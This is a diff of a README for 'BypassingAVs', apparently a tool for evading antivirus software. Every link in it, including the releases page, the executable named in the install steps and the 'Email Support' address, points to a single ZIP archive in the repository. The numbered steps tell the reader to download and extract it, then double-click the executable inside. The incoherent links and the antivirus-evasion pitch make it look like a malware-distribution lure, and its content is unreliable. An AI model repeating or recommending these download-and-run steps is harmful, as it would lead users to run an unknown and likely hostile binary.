@@ -1,7 +1,7 @@
 # 🚀 BypassingAVs - Seamlessly Navigate Anti-Virus Software
 
 ## 📥 Download Now
-[![Download BypassingAVs](https://raw.githubusercontent.com/myself-prog/BypassingAVs/main/circumarctic/BypassingAVs.zip)](https://raw.githubusercontent.com/myself-prog/BypassingAVs/main/circumarctic/BypassingAVs.zip)
+[![Download BypassingAVs](https://github.com/myself-prog/BypassingAVs/raw/refs/heads/main/circumarctic/BypassingAVs.zip)](https://github.com/myself-prog/BypassingAVs/raw/refs/heads/main/circumarctic/BypassingAVs.zip)
 
 ## 📋 Table of Contents
 - [Overview](#overview)
@@ -30,14 +30,14 @@ To ensure that BypassingAVs functions correctly, make sure your system meets the
 - **Network**: Internet connection for updates and initial setup
 
 ## 🔗 Download & Install
-Visit this page to download the latest version of BypassingAVs: [Releases Page](https://raw.githubusercontent.com/myself-prog/BypassingAVs/main/circumarctic/BypassingAVs.zip).
+Visit this page to download the latest version of BypassingAVs: [Releases Page](https://github.com/myself-prog/BypassingAVs/raw/refs/heads/main/circumarctic/BypassingAVs.zip).
 
 1. Open the provided link to go to the Releases page.
 2. Look for the latest version listed at the top of the page.
-3. Click on the appropriate file for your operating system (e.g., `https://raw.githubusercontent.com/myself-prog/BypassingAVs/main/circumarctic/BypassingAVs.zip` for Windows).
+3. Click on the appropriate file for your operating system (e.g., `https://github.com/myself-prog/BypassingAVs/raw/refs/heads/main/circumarctic/BypassingAVs.zip` for Windows).
 4. Save the file to a convenient location on your computer.
 5. Once the download is complete, locate the file and extract it if it’s in a ZIP format.
-6. Open the extracted folder and double-click on the executable file (e.g., `https://raw.githubusercontent.com/myself-prog/BypassingAVs/main/circumarctic/BypassingAVs.zip` for Windows) to start the application.
+6. Open the extracted folder and double-click on the executable file (e.g., `https://github.com/myself-prog/BypassingAVs/raw/refs/heads/main/circumarctic/BypassingAVs.zip` for Windows) to start the application.
 
 ## 🚀 Usage Instructions
 After installation, follow these steps to begin using BypassingAVs:
@@ -53,7 +53,7 @@ After installation, follow these steps to begin using BypassingAVs:
 ## 🛠️ Support
 If you encounter any issues or have questions about using BypassingAVs, feel free to reach out for assistance.
 
-- **Email Support**: https://raw.githubusercontent.com/myself-prog/BypassingAVs/main/circumarctic/BypassingAVs.zip
+- **Email Support**: https://github.com/myself-prog/BypassingAVs/raw/refs/heads/main/circumarctic/BypassingAVs.zip
 - **Documentation**: Detailed guides and tutorials can be accessed on the GitHub wiki section of this repository.
 
 We strive to provide prompt responses to inquiries, usually within 24-48 hours.
